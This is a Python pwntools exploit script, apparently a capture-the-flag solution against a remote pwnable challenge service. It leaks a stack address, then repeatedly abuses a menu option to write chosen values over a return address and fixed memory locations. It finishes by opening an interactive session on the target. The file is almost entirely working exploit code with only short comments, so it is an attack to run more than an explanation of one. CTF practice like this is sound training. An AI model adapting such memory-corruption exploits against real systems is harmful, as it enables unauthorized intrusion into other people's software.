#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'
elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote("svc.pwnable.xyz", 30005)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

io.recvuntil("> ")
io.sendline('2')
stack_addr = int(io.recvline(), 16)
print(hex(stack_addr))


# read into buf
io.recvuntil("> ")
io.sendline('1')
io.sendline(p64(0xdeadbeef) + p64(stack_addr + 0x58))

# overwrite it
io.recvuntil("> ")
io.sendline('3')

# so we got an attribute addr write here
# since RELRO is enabled, we can only edit the stack address
# read again to overwrite the ret addr
io.recvuntil("> ")
io.sendline('1')
io.sendline(p64(0x400a3e) + p64(0x601038))
io.recvuntil("> ")
io.sendline('3')

io.recvuntil("> ")
io.sendline('1')
io.sendline(p64(0x31) + p64(0x601068))
io.recvuntil("> ")
io.sendline('3')

io.recvuntil("> ")
io.sendline('1')
io.sendline(p64(0x11) + p64(0x601040))
io.recvuntil("> ")
io.sendline('3')

io.recvuntil("> ")
io.sendline('0')

io.interactive()






















io.interactive()
